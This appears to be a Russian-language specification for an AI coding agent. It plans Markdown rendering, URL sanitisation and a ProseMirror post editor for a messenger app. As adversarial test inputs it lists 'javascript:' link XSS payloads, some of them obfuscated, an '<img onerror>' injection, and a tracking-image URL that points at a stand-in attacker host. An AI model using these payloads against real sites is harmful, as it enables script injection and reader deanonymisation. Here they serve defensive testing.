# ТЗ: Markdown в Уголке — читающий путь, чат/комментарии, редактор постов

Статус: черновик для Claude Code. Три решения (§0) должны быть зафиксированы
пользователем ДО первого вызова воркера.

Все цифры ниже — измерены на реальной сборке (esbuild, `gzip -9`), не оценены.

---

## 0. Зафиксированные решения

**Р-1. Редактор постов — ProseMirror напрямую, БЕЗ Milkdown.** Замеры:
Milkdown минимальный — 114 КБ gzip; ProseMirror напрямую + `mdast-util-*` —
**86 КБ gzip**. Решающий довод не вес, а грамматика: конвертеры пишутся против
того же mdast-дерева, что использует читающий путь (§1), поэтому схема
редактора и allowlist рендерера — две проекции одного списка узлов, а не два
независимых списка. Инвариант «редактор не может произвести то, что рендерер не
покажет» становится структурным, а не проверяемым.

Отклонены и почему:
- `@milkdown/crepe` — 884 КБ gzip (`@codemirror/legacy-modes` 472 КБ min, KaTeX
  262 КБ min, `@vue/runtime-core`, все грамматики lezer). 707,43 + 884 = 1591 КБ
  при лимите NF-11 1304 КБ.
- `prosemirror-markdown` (официальный) — тянет `markdown-it`, то есть **третью**
  грамматику в проект. Ровно та проблема, которую этот этап решает.
- Самописный WYSIWYG на голом `contenteditable` — **менее** безопасен, а не
  более: вставка из буфера кладёт произвольный HTML в живой DOM, возвращая
  задачу санитизации HTML, от которой проект ушёл структурно. Ценность
  ProseMirror именно в том, что DOM никогда не источник истины — всё
  перепарсивается в документ, ограниченный схемой. Плюс IME-композиция,
  отображение выделения и undo с маппингом позиций.

**Точка возврата.** Если §5 окажется дороже ожидаемого, замена на
`@milkdown/kit` (`core`, `preset/commonmark`, `plugin/history`,
`plugin/listener`, `plugin/clipboard`, `plugin/trailing`, `plugin/cursor`,
`utils`) затрагивает ТОЛЬКО §5. Этапы A, D, E не меняются вовсе. Цена возврата:
+28 КБ gzip и сужение пресета commonmark вручную вместо схемы, которой владеешь.

**Р-2. Single-file и один хеш — сохраняются.** Раскол на чанки рассматривался
только из-за цены Crepe, которой не существует. При ~86 КБ раскол платит NF-18
(«сверь один хеш» → «сверь два хеша плюс SRI») и свойством «скачал `index.html`,
открыл где угодно» — тем самым, ради которого singlefile и выбирался.

**Р-3. Формат-маркер `format: "md"` — НЕ добавляется.** Исходное обоснование
(«старые тексты переинтерпретируются») проверено на реальном парсере и оказалось
слабее, чем предполагалось: правила flanking в CommonMark оставляют
`Цена 5 * 3 * 2 рубля`, `снег_идёт_сильно`, `#хэштег`, `путь C:\dir_name_here`,
`2 < 3` нетронутыми. Единственный реальный ложноположительный случай — строка,
начинающаяся с `- `, становится списком. Данных в проекте нет (тестовые посты),
второго формата не планируется. Прежний «Этап B» удалён.

**Р-4. Счёт длины поста.** Пользователю показывается лимит по plain-тексту
(`toPlainText`), на исходник действует скрытый жёсткий потолок. Значения:
plain ≤ 10000 (как сейчас), source ≤ 20000.

## 1. Этап A — единый читающий путь

### A.1. Причина, а не задача

Существующий `src/domain/help/markdown.js` написан для доверенного контента и
для недоверенного не годится. Воспроизведено:

| Вход | remark выдаёт | Свой парсер показывает |
|---|---|---|
| `Цена 5 * 3 рубля` | `Цена 5 \* 3 рубля` | литеральный `\*` |
| вложенный список | `* верх\n  * низ` | список из одного пункта + абзац `  * низ` |
| `#### заголовок` | `#### заголовок` | литеральные решётки |
| цитата из двух строк | `> a\n> b` | ДВЕ отдельные цитаты |
| перенос строки | `a\nb` | склеено в `a b` |
| `[к](javascript:alert(1))` | — | **живая `javascript:`-ссылка в `href`** |

Последняя строка — работающий XSS: `markdown-view.jsx` кладёт `node.href` в
атрибут напрямую, Preact не фильтрует, CSP в `index.html` отсутствует.

Первые пять строк неустранимы, пока пишет одна грамматика (remark внутри
Milkdown), а читает другая. Паритет обеспечивается только общим движком.

### A.2. Что сделать

Новый модуль `src/core/markdown/` (не `domain/` — общий для help, постов, чата,
комментариев):

- **`parse.js`** — обёртка над `mdast-util-from-markdown`. Добавить **прямой**
  зависимостью в `package.json` (сейчас транзитивна через Milkdown; полагаться
  на транзитивную — мина). Два профиля:
  - `parseRich(source)` — посты и «Справка»: heading 1–3, paragraph, list
    (включая вложенные), blockquote, code, thematicBreak; inline: strong,
    emphasis, inlineCode, link, break.
  - `parseLite(source)` — чат, комментарии, общий чат: paragraph, list,
    blockquote; inline: strong, emphasis, inlineCode, link, break. Заголовки,
    код-блоки и hr **деградируют в текст**, не отбрасываются.
- **`sanitize.js`** — `safeHref(url)`. Разрешены `https:`, `http:`, `mailto:` и
  относительные. Всё прочее (`javascript:`, `data:`, `vbscript:`, `blob:`,
  `file:`) → узел рендерится обычным текстом, не ссылкой.
  Проверка **после** парсинга mdast (парсер уже декодировал `&#106;avascript:`),
  с нормализацией: `trim`, удаление `\u0000`–`\u001F` и `\u007F`, схема в
  нижний регистр. Проверять «начинается со схемы из allowlist», а не «не
  содержит запрещённое».
- **`to-plain.js`** — `toPlainText(tree)`: mdast → плоская строка. Нужен для
  aria-label, превью последнего сообщения, тела уведомлений.

Переписать `src/ui/components/markdown-view.jsx`: принимает `source` и
`profile` (`"rich" | "lite"`), рендерит из mdast в Preact-элементы по строгому
allowlist типов узлов. `default` в `switch` возвращает **текстовое содержимое
узла**, а не `null` — неизвестный узел не должен молча исчезать.
`dangerouslySetInnerHTML` не появляется нигде — инвариант сохраняется.

**Узел `image` не рендерится как `<img>` ни в одном профиле.** Причина
архитектурная, не косметическая: `![](https://attacker/px?u=...)` в комментарии
заставляет браузер каждого читателя обратиться к серверу по выбору автора —
деанонимизация IP всей аудитории канала. Для мессенджера с моделью угроз этого
проекта это отдельный класс уязвимости, а не мелочь. Рендерить как ссылку через
`safeHref` либо как alt-текст. **Записать в CONTRACTS.md с этой мотивировкой.**

Автоссылки (голый URL в тексте) — не включать. GFM не подключается.

### A.3. Миграция «Справки»

Перевести `help-content.jsx` на новый рендерер, **удалить**
`src/domain/help/markdown.js` и `tests/help-markdown.test.js`. Две реализации
markdown в одном проекте — гарантированное расхождение через полгода.
Контент справки (13 локалей, `src/content/help/*`) прогнать через новый парсер
и глазами сверить вывод: старый парсер склеивал строки абзаца пробелом, remark
делает то же — расхождений быть не должно, но проверить, а не предположить.

### A.4. Тесты (до кода)

Портировать содержательные кейсы из `help-markdown.test.js`, плюс адверсарные:

- `javascript:`, `JaVaScRiPt:`, `java\u0000script:`, `\tjavascript:`,
  `data:text/html;base64,...`, `vbscript:` — все дают текст, не ссылку.
- `&#106;avascript:alert(1)` — декодируется парсером, ловится `safeHref`.
- Вложенность 1000 уровней (`> > > ...`, `**` подряд) — не роняет стек.
- 10 000 символов патологического ввода (`*` вперемешку с текстом) парсится
  быстрее 50 мс. Старый `parseInline` здесь квадратичен (4 регэкспа × n позиций,
  каждый сканирует до конца строки) — micromark линеен, тест это фиксирует.
- Каждый профиль: `parseLite` на заголовке даёт текст, не `<h1>`.

## 3. Этап D — markdown в чате, комментариях, общем чате

Никакого WYSIWYG. Ноль новых зависимостей.

Рендер: заменить в четырёх местах вывод сырого текста на
`<MarkdownView source={...} profile="lite" />`:
`message-bubble.jsx:92` (личные, групповые, комнаты «Быстрая связь» через
`quick.jsx`), `channel-chat.jsx:163`, `channel.jsx:429` (комментарии).
`post-card.jsx:35` — профиль `rich`.

Ввод: существующие `<textarea>` + маленькая панель кнопок (жирный, курсив,
цитата, список, ссылка), вставляющих символы разметки в позицию курсора
(`selectionStart`/`selectionEnd`, `setRangeText`). Панель — общий компонент,
переиспользуется всеми тремя композерами.

Режим редактирования сообщения (`message-bubble.jsx`) показывает исходник в
`<textarea>` — это корректно, менять не нужно.

Лимиты `MESSAGE_MAX_LENGTH = 4000` / `COMMENT_MAX_LENGTH = 4000` /
`MAX_MESSAGE_LENGTH = 10000` — остаются как есть (Р-4 про plain/source касается
только постов; в чате разметки мало и разница несущественна).

## 4. Этап C — редактор постов (ProseMirror напрямую)

Делать **последним**: самый дорогой, самый рискованный, единственный, который
откатывается без следа в протоколе и без правок в A/D/E.

### C.0. Спайк ДО написания кода (обязателен, ~30 минут)

Голый `EditorView` с минимальной схемой, открытый на **реальном телефоне**
пользователя. Проверить: русская раскладка, свайп-ввод, автоподстановка,
вставка из буфера, поведение при появлении экранной клавиатуры. Это
единственный риск всего ТЗ, который не ловится ни одним автотестом.
Отрицательный результат снимает §5 целиком и возвращает к варианту
«textarea + панель + вкладка Предпросмотр» за 0 КБ.

### C.1. Зависимости

`prosemirror-state`, `prosemirror-view`, `prosemirror-model`,
`prosemirror-transform`, `prosemirror-commands`, `prosemirror-history`,
`prosemirror-keymap`, `prosemirror-inputrules`, `prosemirror-schema-list`.
`mdast-util-from-markdown` уже добавлен на этапе A; добавить
`mdast-util-to-markdown`. Замер полного набора: **86 КБ gzip**.

Не добавлять: `prosemirror-markdown` (тянет `markdown-it`),
`prosemirror-schema-basic` (проще написать свою схему на 60 строк, чем
вычищать из чужой узлы `image`/`hard_break`, которых быть не должно).

### C.2. Структура модуля `src/ui/editor/`

- **`schema.js`** — `new Schema({nodes, marks})`. Узлы: `doc`, `paragraph`,
  `heading` (attrs.level ∈ 1..3), `blockquote`, `bullet_list`, `ordered_list`,
  `list_item`, `code_block`, `horizontal_rule`, `text`. Марки: `strong`, `em`,
  `code`, `link` (attrs.href).
  **Узла `image` в схеме нет.** Это и есть механизм запрета из §A.2 — не
  проверка, а отсутствие возможности. Вставка картинки из буфера просто
  некуда деться, ProseMirror отбросит её при парсинге.
  Список узлов схемы обязан совпадать с allowlist профиля `rich` в
  `markdown-view.jsx`. Держать оба списка в одном файле-константе
  (`src/core/markdown/node-allowlist.js`), импортируемом обоими — иначе они
  разъедутся при первом же расширении.
- **`from-mdast.js`** — mdast-дерево → PM-документ. Узлы вне схемы
  разворачиваются в текст, не отбрасываются.
- **`to-mdast.js`** — PM-документ → mdast, дальше `toMarkdown()`. Настроить
  `bullet: "-"`, `emphasis: "*"`, `strong: "*"`, `rule: "-"` — чтобы вывод
  визуально совпадал с тем, что пользователь набирает вручную в чате (§4).
- **`input-rules.js`** — `# `→heading, `> `→blockquote, `- `/`* `→bullet_list,
  `1. `→ordered_list, ``` ` ```→code_block (wrappingInputRule /
  textblockTypeInputRule). Марки `**`/`*` — через свои правила на регулярках.
- **`keymap.js`** — `baseKeymap` + undo/redo + Enter/Tab внутри списков
  (`splitListItem`, `sinkListItem`, `liftListItem`).
- **`editor.jsx`** — Preact-обёртка.
- **`toolbar.jsx`** — панель: жирный, курсив, заголовок, цитата, список
  маркированный, список нумерованный, ссылка, код. Команды —
  `toggleMark(schema.marks.strong)`, `wrapIn`, `setBlockType`, `wrapInList`.
  Активное состояние кнопки — по `state.selection` и меткам в `storedMarks`.
  Строки — через `t()`, все 13 локалей.

### C.3. Ссылки

Диалог вставки ссылки прогоняет URL через **тот же** `safeHref` из
`src/core/markdown/sanitize.js`. Не своя проверка. Если URL отклонён — не
молчать, показать причину.

### C.4. Интеграция с Preact

- `<div ref={hostRef} />`, в который Preact **никогда** не рендерит детей.
  ProseMirror владеет поддеревом целиком.
- Создание `EditorView` в `useEffect` с пустым массивом зависимостей,
  `view.destroy()` в cleanup.
- Текст наружу — в `dispatchTransaction`, только при `tr.docChanged`.
- **Не делать контролируемый компонент.** Прокидывание `value` обратно на
  каждый ввод убивает позицию курсора и ломает IME-композицию — критично для
  русской раскладки и свайп-ввода.
- Начальное значение — один раз при создании, из `EditorState.create({doc})`.

### C.5. CSS

`prosemirror-view/style/prosemirror.css` (~40 строк) **скопировать** в
`src/styles/`, не импортировать из `node_modules` — иначе чужие стили идут мимо
axis-фреймворка. Оформление — поверх собственных токенов (`--lamp`,
`--draught`, шкала `--space-*`).

### C.6. Черновики

`updateDraftPost` уже принимает `text` — редактор отдаёт markdown-исходник,
доменный слой не меняется вовсе.

### C.7. Тесты

- **Property-тест round-trip**: для набора документов
  `toMarkdown(toMdast(fromMdast(parseRich(src)))) ≡ src` с точностью до
  нормализации. Это механический гейт паритета грамматик.
- Схема не содержит узлов вне `node-allowlist.js` (проверка на самом объекте
  `schema.nodes`, а не глазами).
- Вставка HTML с `<img>`, `<script>`, `<iframe>`, `onerror=` через
  `DOMParser.fromSchema` — в документе не остаётся ничего, кроме текста.
- `safeHref` отклоняет `javascript:` в диалоге ссылки.

## 5. Порядок и Definition of Done

Порядок: **A → E → D → C.0 (спайк) → C**. A даёт немедленную пользу и
закрывает XSS; E дёшев и предотвращает регресс безопасности; D тривиален после
A и уже даёт markdown в чате; C изолирован и откатываем, а его спайк на
реальном телефоне идёт до единой строки кода редактора.

Механические гейты на каждом этапе:

1. `npm test` зелёный, число тестов не уменьшилось (кроме осознанного удаления
   `help-markdown.test.js` на этапе A — зафиксировать в log.md).
2. `npm run build` — записать цифру gzip в PLAN.md. Пороги: после A ≤ 730 КБ,
   после D ≤ 735 КБ, после C ≤ 815 КБ (текущая база — 707,43 КБ, лимит NF-11 —
   1304 КБ). Превышение порога — стоп, разбираться, а не «ну и ладно».
3. `grep -rn "dangerouslySetInnerHTML\|innerHTML" src/` — пусто.
4. `grep -rn "domain/help/markdown" src/ tests/` — пусто после этапа A.
5. Живой E2E, три браузера, реальный strfry:
   - пост с вложенным списком, цитатой из двух строк, жирным, ссылкой и
     литеральной звёздочкой в тексте — у автора и у подписчика **одинаково**;
   - комментарий с `[клик](javascript:alert(1))` от одного участника — у
     читателя текст, не кликабельная ссылка, консоль чиста;
   - вставка HTML-фрагмента с `<img onerror=...>` в редактор поста —
     в опубликованном тексте ничего, кроме текста.
6. Живая проверка на реальном телефоне (этап C): экранная клавиатура, русская
   раскладка, свайп-ввод, вставка из буфера — курсор не прыгает, композер не
   уезжает под клавиатуру, скролл ленты не ломается. Формально это повтор
   спайка C.0, но уже на собранном редакторе внутри приложения.

## 6. Что этот документ сознательно НЕ покрывает

- Таблицы, задачи-чекбоксы, сноски (GFM) — вне скоупа.
- Подсветка синтаксиса в код-блоках — вне скоупа (именно она даёт +472 КБ в
  Crepe).
- Формулы (KaTeX) — вне скоупа.
- Совместное редактирование — вне скоупа.
- Автоссылки на голые URL — вне скоупа, решить отдельно.
- Изображения по произвольному URL — **запрещены архитектурно** (§A.2 на
  чтении, §C.2 на записи), не «отложены». Картинки в постах остаются через существующий Blossom-путь
  вложений.
